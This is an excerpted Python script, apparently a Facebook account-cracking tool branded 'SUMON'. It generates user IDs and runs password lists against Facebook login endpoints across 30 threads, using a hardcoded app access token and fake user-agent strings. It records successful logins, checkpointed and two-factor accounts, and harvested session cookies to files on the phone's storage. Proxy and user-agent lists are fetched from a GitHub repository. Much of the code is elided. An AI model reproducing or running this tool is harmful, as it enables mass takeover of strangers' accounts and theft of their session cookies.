...
print('\x1b[1;95m[•] SECURITY CHECKING   ')


try:
	prox= requests.get('https://github.com/Sumon404cyber/ATOM/blob/main/proxy0.txt').text
	open('proxies.txt','w').write(proxies)
except Exception as e:
	print('\x1b[1;95m[√] COMPLETE FULL LOADING...')
...
android_models=[]
try:
	xx = requests.get('https://github.com/Sumon404cyber/ATOM/blob/main/proxy1.txt').text.splitlines()
	for line in xx:
...
usr=[]
try:
	xd=requests.get('https://github.com/Sumon404cyber/ATOM/blob/main/proxy1.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
...
logo = ("""\033[1;37m
      ##     ##     #######     ##     ##
      ##     ##    ##     ##    ##     ##
      ##     ##    ##     ##    ##     ##   \033[1;36m𝐏\033[1;37m
      #########    ##     ##    #########  \033[1;34m 𝐑\033[1;37m
             ##    ##     ##           ##   \033[1;33m𝐎 \033[1;37m
             ##    ##     ##           ## 
             ##     #######            ##
--------------------------------------------------""")
def linex():
...
def pak():
		...
		for nmbr in range(limit):
			...
			user.append(nmp)
		with tred(max_workers=30) as SUMON:	
			clear()
			tl = str(len(user))
			...
			for psx in user:
				...
				if mthd in ['1','01']:
					SUMON.submit(SUMON4,ids,passlist)
...
def gmail():
		...
		clear()
		print('\033[1;37m example: sumon, milon, \033[1;97m')
		linex()
		first = input(' Put first name: ')
		linex()
		print('\033[1;37m example: roy, das, \033[1;97m')
		linex()
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [SUMON-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [SUMON-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/SUMON-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [SUMON-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [SUMON-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/SUMON-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/SUMON-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[SUMON-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
...
#method4
def SUMON4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [BSUMON-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [SUMON-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\033[1;32m [\033[1;37mBISCUIT\033[1;32m]\033[1;37m '+coki)
                                        open('/sdcard/SUMON-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/SUMON-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\033[1;33m [SUMON-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SUMON-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
